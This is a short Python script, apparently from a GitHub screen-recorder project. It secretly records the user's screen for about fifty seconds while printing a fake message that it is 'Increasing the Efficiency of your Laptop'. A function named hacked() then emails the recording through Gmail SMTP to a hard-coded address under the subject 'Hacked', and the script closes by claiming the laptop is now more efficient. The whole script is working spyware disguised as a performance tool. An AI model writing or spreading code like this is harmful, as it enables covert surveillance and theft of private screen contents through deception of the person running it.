# importing the required packages
import pyautogui
import cv2, os
import numpy as np

# Specify resolution
resolution = (1920, 1080)

# Specify video codec
codec = cv2.VideoWriter_fourcc(*"XVID")

# Specify name of Output file
filename = "Efficient.mp4"

# Specify frames rate. We can choose any
# value and experiment with it
fps = 15.0

# Creating a VideoWriter object
out = cv2.VideoWriter(filename, codec, fps, resolution)

# Create an Empty window
# cv2.namedWindow("Live", cv2.WINDOW_NORMAL)

# Resize this window
# cv2.resizeWindow("Live", 480, 270)

import time
tic = time.perf_counter()

while True:
    # Take screenshot using PyAutoGUI
    img = pyautogui.screenshot()

    # Convert the screenshot to a numpy array
    frame = np.array(img)

    # Convert it from BGR(Blue, Green, Red) to
    # RGB(Red, Green, Blue)
    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

    # Write it to the output file
    out.write(frame)

    # Optional: Display the recording screen
    # cv2.imshow('Live', frame)

    # Stop recording when we press 'q'
    # if cv2.waitKey(1) == ord('q'):
    # 	break

    toc = time.perf_counter()
    diff = toc-tic
    # print(type(diff), diff)

    os.system("cls")
    print('\n\t...Increasing the Efficiency of your Laptop.\nWait a minute.')

    if diff > 50:
        break

# Release the Video writer
out.release()

# Destroy all windows
cv2.destroyAllWindows()

# https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4NCqPzrmYABGDvDXRZ2otRGTMvD3g1gchNo0HTKiGEIr3HlCp-RFNAtMwvDEpYACPiCBp2ggt9X5ztsf1LUR5dVhW6nag
def hacked():

    import smtplib
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders

    fromaddr = "imvickykumar999@gmail.com"
    toaddr = ["yoyobadal111111@gmail.com",
              fromaddr,
              'hellovickykumar123@gmail.com'][1]

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr

    msg['Subject'] = "Hacked"
    link = 'https://github.com/imvickykumar999/Screen-Recorder'
    body = f'''
    This E-Mail is Sent using python code using {link},
    '''
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(filename, "rb")

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    try:
        s.login(fromaddr, "**********")
        # print('Mailing')
    except Exception as e:
        print(e)

    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

hacked()
# os.remove(filename)
input('\n\t...Now your Laptop is more Efficient.')
